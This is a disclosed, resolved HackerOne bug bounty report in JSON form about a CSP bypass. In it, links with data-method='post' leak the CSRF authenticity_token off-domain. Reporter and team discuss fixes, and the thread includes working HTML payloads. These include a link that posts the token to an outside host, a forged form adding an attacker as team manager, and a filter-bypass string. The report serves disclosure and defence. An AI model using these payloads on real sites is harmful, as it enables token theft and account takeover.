{"id":47472,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzQ3Mg==","url":"https://hackerone.com/reports/47472","title":"CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-02-11T20:03:01.597Z","submitted_at":"2015-02-11T20:03:01.597Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"danlec","url":"/danlec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-02-26T21:50:46.056Z","bug_reporter_agreed_on_going_public_at":"2015-02-26T21:50:45.257Z","team_member_agreed_on_going_public_at":"2015-02-26T21:44:10.626Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Background**\r\n\r\n- There has been [at least one case](/reports/46072) where [an attacker](/danlec) was able to insert arbitrary HTML into a submitted report\r\n- HackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins\r\n- HackerOne uses an `authenticity_token` in its POSTs to guard against CSRF attacks\r\n- There is a click handler for links with a`data-method` attribute that makes it so an `\u003ca\u003e` tag with a `data-method=\"post\"` will send the CSRF token in a POST to the `href` of the link, **even if the target is a different origin**\r\n\r\n**Proof of concept**\r\n\r\n1.  Suppose that someone is able to find an exploit similar to #46072, allowing them to insert arbitrary HTML into a report, and they insert the following payload:\r\n```\r\n\u003ca href=\"http://danlec.com\" data-method=\"post\"\u003eProof of Concept\u003c/a\u003e\r\n```\r\n  Since I'm not currently aware of a means of doing this, we'll have to simulate this by running the following from the console:\r\n```\r\n$(\".hacktivity-container-content:first\")\r\n .html('\u003cp\u003e\u003ca href=\"http://danlec.com\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\u003c/p\u003e')\r\n```\r\n  (Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)\r\n\r\n2.  When the victim clicks the link, the current `authenticity_token` is sent to \u003chttp://danlec.com\u003e.  You can inspect the headers that are sent, or have the link be \u003chttp://httpbin.org/post\u003e which will echo the headers that it was sent.\r\n\r\n3.  Using the `authenticity_token` it was provided, the target of the link could automatically submit a form like the following on the victim's behalf:\r\n```\r\n\u003cform method=\"POST\" action=\"https://hackerone.com/danlec-test/team_members\"\r\n     target=\"_blank\"\u003e\r\n  \u003cinput type=\"text\" name=\"authenticity_token\" \r\n     value=\"authenticity_token from the POST to this page\"\u003e\r\n  \u003cinput type=\"text\" name=\"invitations_team_member[email]\" \r\n     value=\"attacker@gmail.com\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"team_member[add_as_manager]\" value=\"1\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"utf8\" value=\"✓\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"commit\" value=\"Send invite\"\u003e\r\n  \u003cinput type=\"submit\"\u003e\r\n\u003c/form\u003e\r\n```\r\n\r\nIt would make sense if the click handler for links with a `data-method` attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.\r\n\r\n","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eBackground\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThere has been \u003ca href=\"/reports/46072\"\u003eat least one case\u003c/a\u003e where \u003ca href=\"/danlec\"\u003ean attacker\u003c/a\u003e was able to insert arbitrary HTML into a submitted report\u003c/li\u003e\n\u003cli\u003eHackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins\u003c/li\u003e\n\u003cli\u003eHackerOne uses an \u003ccode\u003eauthenticity_token\u003c/code\u003e in its POSTs to guard against CSRF attacks\u003c/li\u003e\n\u003cli\u003eThere is a click handler for links with a\u003ccode\u003edata-method\u003c/code\u003e attribute that makes it so an \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e tag with a \u003ccode\u003edata-method=\u0026quot;post\u0026quot;\u003c/code\u003e will send the CSRF token in a POST to the \u003ccode\u003ehref\u003c/code\u003e of the link, \u003cstrong\u003eeven if the target is a different origin\u003c/strong\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003cstrong\u003eProof of concept\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eSuppose that someone is able to find an exploit similar to \u003ca href=\"/reports/46072\"\u003e#46072\u003c/a\u003e, allowing them to insert arbitrary HTML into a report, and they insert the following payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;http://danlec.com\u0026quot; data-method=\u0026quot;post\u0026quot;\u0026gt;Proof of Concept\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince I\u0026#39;m not currently aware of a means of doing this, we\u0026#39;ll have to simulate this by running the following from the console:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$(\u0026quot;.hacktivity-container-content:first\u0026quot;)\n.html(\u0026#39;\u0026lt;p\u0026gt;\u0026lt;a href=\u0026quot;http://danlec.com\u0026quot; data-method=\u0026quot;post\u0026quot;\u0026gt;Click Me!\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWhen the victim clicks the link, the current \u003ccode\u003eauthenticity_token\u003c/code\u003e is sent to \u003ca title=\"http://danlec.com\" href=\"/redirect?url=http%3A%2F%2Fdanlec.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://danlec.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  You can inspect the headers that are sent, or have the link be \u003ca title=\"http://httpbin.org/post\" href=\"/redirect?url=http%3A%2F%2Fhttpbin.org%2Fpost\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://httpbin.org/post\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which will echo the headers that it was sent.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUsing the \u003ccode\u003eauthenticity_token\u003c/code\u003e it was provided, the target of the link could automatically submit a form like the following on the victim\u0026#39;s behalf:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;https://hackerone.com/danlec-test/team_members\u0026quot;\n target=\u0026quot;_blank\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;authenticity_token\u0026quot; \n value=\u0026quot;authenticity_token from the POST to this page\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;invitations_team_member[email]\u0026quot; \n value=\u0026quot;attacker@gmail.com\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;team_member[add_as_manager]\u0026quot; value=\u0026quot;1\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;utf8\u0026quot; value=\u0026quot;✓\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;commit\u0026quot; value=\u0026quot;Send invite\u0026quot;\u0026gt;\n\u0026lt;input type=\u0026quot;submit\u0026quot;\u0026gt;\n\u0026lt;/form\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIt would make sense if the click handler for links with a \u003ccode\u003edata-method\u003c/code\u003e attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-03-28T21:44:16.580Z","allow_singular_disclosure_after":-181642770.382701,"singular_disclosure_allowed":true,"vote_count":6,"voters":["sw33tlie","mygf","r3y","japz","eidelweiss","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":330389,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Slick CSP bypass. We'll get this fixed, either by removing the behavior entirely or restricting it to internal domains. Resolution timeline might be a bit longer if we opt for the former route as we currently depend upon this behavior in a handful of areas and it doesn't seem to warrant an urgent fix. Thanks!","markdown_message":"\u003cp\u003eSlick CSP bypass. We\u0026#39;ll get this fixed, either by removing the behavior entirely or restricting it to internal domains. Resolution timeline might be a bit longer if we opt for the former route as we currently depend upon this behavior in a handful of areas and it doesn\u0026#39;t seem to warrant an urgent fix. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-11T21:45:47.513Z","updated_at":"2015-02-11T21:45:47.513Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":330396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great!  I just wish I'd thought of that **before** submitting #46072 because that would have been so much cooler :)","markdown_message":"\u003cp\u003eGreat!  I just wish I\u0026#39;d thought of that \u003cstrong\u003ebefore\u003c/strong\u003e submitting \u003ca href=\"/reports/46072\"\u003e#46072\u003c/a\u003e because that would have been so much cooler :)\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-11T21:47:40.879Z","updated_at":"2015-02-11T21:47:40.879Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @danlec, \n\nWe have made a preliminary fix that changes the `data-method` binding outside of the `markdownable` area. So your original POC would still work, but if you inserted your link within the typical markdown area then our patch should apply.\n\nOur longer term fix is to whitelist the urls that are allowed to be sent the CSRF token. The patch we developed is currently up for review here: https://github.com/rails/jquery-ujs/pull/403\n\nIf you have a chance, can you confirm our interim fix and advise on our longer term fix?\n\nThanks again for the great report!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/danlec\"\u003e@danlec\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eWe have made a preliminary fix that changes the \u003ccode\u003edata-method\u003c/code\u003e binding outside of the \u003ccode\u003emarkdownable\u003c/code\u003e area. So your original POC would still work, but if you inserted your link within the typical markdown area then our patch should apply.\u003c/p\u003e\n\n\u003cp\u003eOur longer term fix is to whitelist the urls that are allowed to be sent the CSRF token. The patch we developed is currently up for review here: \u003ca title=\"https://github.com/rails/jquery-ujs/pull/403\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Fjquery-ujs%2Fpull%2F403\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/jquery-ujs/pull/403\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf you have a chance, can you confirm our interim fix and advise on our longer term fix?\u003c/p\u003e\n\n\u003cp\u003eThanks again for the great report!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-16T23:25:26.946Z","updated_at":"2015-02-16T23:25:26.946Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":333152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We just figured out that our temporary fix really only fixes your POC, but not any real HTML insertion use case, as the researcher would still be able to insert closing HTML tags to break out of our \"blacklisted\" selector. This is why we would like to wait for the real fix to be landed, before we close/disclose this diff.","markdown_message":"\u003cp\u003eWe just figured out that our temporary fix really only fixes your POC, but not any real HTML insertion use case, as the researcher would still be able to insert closing HTML tags to break out of our \u0026quot;blacklisted\u0026quot; selector. This is why we would like to wait for the real fix to be landed, before we close/disclose this diff.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-16T23:53:54.865Z","updated_at":"2015-02-16T23:53:54.865Z","actor":{"username":"rso","cleared":false,"url":"/rso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/031/bad304b45f09b089c121de18c65d91d226f0aeea_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333203,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looking at that diff, it seems that the framework is still too trusting of the `href` on the link, and assumes that it can be concatenated to HTML without any escaping; it seems like you could set up a link like this:\n\n```\n\u003ca href=\"http://example.com?\u0026quot;\u003e\u003c/form\u003e\u003cform action=\u0026quot;http://danlec.com\u0026quot;\u003e\u003c\u0026quot;\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\n```\n\n… which appears to be enough to pass a simple `/example\\.com/.test(hostname)` check while still causing the form with the CSRF token to be submitted to a non-whitelisted domain.  \n\n(Now that I've got my code review hat on, maybe the test filters should be `/^localhost$/` and `/^rubyonrails\\.org$/` so nobody looking at those ends up with filters that could be defeated by `http://rubyonrailsxorglocalhost.com` or thinks they need to have an `http://` in there … unless you were wanting to check the `origin` instead of the `hostname`?)","markdown_message":"\u003cp\u003eLooking at that diff, it seems that the framework is still too trusting of the \u003ccode\u003ehref\u003c/code\u003e on the link, and assumes that it can be concatenated to HTML without any escaping; it seems like you could set up a link like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;http://example.com?\u0026amp;quot;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;form action=\u0026amp;quot;http://danlec.com\u0026amp;quot;\u0026gt;\u0026lt;\u0026amp;quot;\u0026quot; data-method=\u0026quot;post\u0026quot;\u0026gt;Click Me!\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e… which appears to be enough to pass a simple \u003ccode\u003e/example\\.com/.test(hostname)\u003c/code\u003e check while still causing the form with the CSRF token to be submitted to a non-whitelisted domain.  \u003c/p\u003e\n\n\u003cp\u003e(Now that I\u0026#39;ve got my code review hat on, maybe the test filters should be \u003ccode\u003e/^localhost$/\u003c/code\u003e and \u003ccode\u003e/^rubyonrails\\.org$/\u003c/code\u003e so nobody looking at those ends up with filters that could be defeated by \u003ccode\u003ehttp://rubyonrailsxorglocalhost.com\u003c/code\u003e or thinks they need to have an \u003ccode\u003ehttp://\u003c/code\u003e in there … unless you were wanting to check the \u003ccode\u003eorigin\u003c/code\u003e instead of the \u003ccode\u003ehostname\u003c/code\u003e?)\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-17T06:00:14.276Z","updated_at":"2015-02-17T06:12:56.912Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333821,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks again for the feedback, as usual that's another great attack string, I have updated the PR accordingly. Let us know if there is any additional feedback.\n\nWe're not sure if the PR will be inline with what the community wants, but plan on forking and using our own version in the meantime. Hopefully we can push this out shortly.\n\nThanks for your patience!","markdown_message":"\u003cp\u003eThanks again for the feedback, as usual that\u0026#39;s another great attack string, I have updated the PR accordingly. Let us know if there is any additional feedback.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re not sure if the PR will be inline with what the community wants, but plan on forking and using our own version in the meantime. Hopefully we can push this out shortly.\u003c/p\u003e\n\n\u003cp\u003eThanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-18T02:23:03.881Z","updated_at":"2015-02-18T02:23:03.881Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":333892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, the pull request looks safer now.\n\nIf it wasn't already clear, bear in mind that the current setup can **still** cause bad things to happen **without** going to another domain, e.g. with\n\n```\n\u003ca href=\"/danlec-test/team_members?invitations_team_member[email]=attacker@example.com\u0026team_member[add_as_manager]=1\u0026commit=Send+Invite\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\n```\n\n… since the routes appear to let you have some of the parameters in the query string, you don't need to be able to construct a form to POST.\n\n","markdown_message":"\u003cp\u003eOkay, the pull request looks safer now.\u003c/p\u003e\n\n\u003cp\u003eIf it wasn\u0026#39;t already clear, bear in mind that the current setup can \u003cstrong\u003estill\u003c/strong\u003e cause bad things to happen \u003cstrong\u003ewithout\u003c/strong\u003e going to another domain, e.g. with\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;a href=\u0026quot;/danlec-test/team_members?invitations_team_member[email]=attacker@example.com\u0026amp;team_member[add_as_manager]=1\u0026amp;commit=Send+Invite\u0026quot; data-method=\u0026quot;post\u0026quot;\u0026gt;Click Me!\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e… since the routes appear to let you have some of the parameters in the query string, you don\u0026#39;t need to be able to construct a form to POST.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-18T06:50:11.403Z","updated_at":"2015-02-18T06:50:11.403Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341023,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like you're going with the \"removing the behavior entirely\" approach, which appears to be the only safe option.","markdown_message":"\u003cp\u003eLooks like you\u0026#39;re going with the \u0026quot;removing the behavior entirely\u0026quot; approach, which appears to be the only safe option.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-26T18:57:00.930Z","updated_at":"2015-02-26T19:01:25.509Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341212,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hehe, yeah, this took a while to get right, but in the end just disabling it was probably the best option. \n\nFor the record, this is what we did:\n\nI've monkeypatched the `rails-ujs` `$.rails.handleMethod` method, like this:\n\n```coffeescript\n$.rails.handleMethod = -\u003e throw \"nope\"\n```\n\nAnd replaced all uses of `data-method` in our codebase with a custom helper, that actually generates the following html:\n\n```html\n\u003cform action=\"https://hackerone.com/url\" method=\"post\"\u003e\n  \u003c!-- csrf stuff --\u003e\n  \u003cbutton type=\"submit\" class=\"im-a-link\"\u003eRemote link\u003c/submit\u003e\n\u003c/form\u003e\n```\n\nAn attacker can not insert this HTML through an XSS because of the CSRF stuff.\n\nEventually we want to replace all these use cases with clean CoffeeScript/React code, but that would've taken a lot longer to implement.\n\nIf you think that this fix was not sufficient, please let me know!","markdown_message":"\u003cp\u003eHehe, yeah, this took a while to get right, but in the end just disabling it was probably the best option. \u003c/p\u003e\n\n\u003cp\u003eFor the record, this is what we did:\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve monkeypatched the \u003ccode\u003erails-ujs\u003c/code\u003e \u003ccode\u003e$.rails.handleMethod\u003c/code\u003e method, like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight coffeescript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003erails\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ehandleMethod\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;nope\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd replaced all uses of \u003ccode\u003edata-method\u003c/code\u003e in our codebase with a custom helper, that actually generates the following html:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://hackerone.com/url\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"c\"\u003e\u0026lt;!-- csrf stuff --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;im-a-link\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eRemote link\u003cspan class=\"nt\"\u003e\u0026lt;/submit\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAn attacker can not insert this HTML through an XSS because of the CSRF stuff.\u003c/p\u003e\n\n\u003cp\u003eEventually we want to replace all these use cases with clean CoffeeScript/React code, but that would\u0026#39;ve taken a lot longer to implement.\u003c/p\u003e\n\n\u003cp\u003eIf you think that this fix was not sufficient, please let me know!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-26T20:30:58.243Z","updated_at":"2015-02-26T20:30:58.243Z","actor":{"username":"rso","cleared":false,"url":"/rso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/031/bad304b45f09b089c121de18c65d91d226f0aeea_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"danlec","url":"/danlec"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, I scoped it out when I saw you made the change (…and was wondering if you'd used some kind of helper to generate the forms!) and this should be sufficient … assuming there aren't **other** dangerous global helpers of course :)\n\nDo you think this is interesting enough to warrant public disclosure?","markdown_message":"\u003cp\u003eYeah, I scoped it out when I saw you made the change (…and was wondering if you\u0026#39;d used some kind of helper to generate the forms!) and this should be sufficient … assuming there aren\u0026#39;t \u003cstrong\u003eother\u003c/strong\u003e dangerous global helpers of course :)\u003c/p\u003e\n\n\u003cp\u003eDo you think this is interesting enough to warrant public disclosure?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-26T21:10:33.175Z","updated_at":"2015-02-26T21:17:10.861Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341275,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-26T21:43:57.679Z","updated_at":"2015-02-26T21:43:57.679Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"danlec","url":"/danlec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341276,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-26T21:44:15.507Z","updated_at":"2015-02-26T21:44:15.507Z","first_to_agree":true,"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341277,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-26T21:44:46.292Z","updated_at":"2015-02-26T21:44:46.292Z","additional_data":{"old_title":"Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain","new_title":"CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off 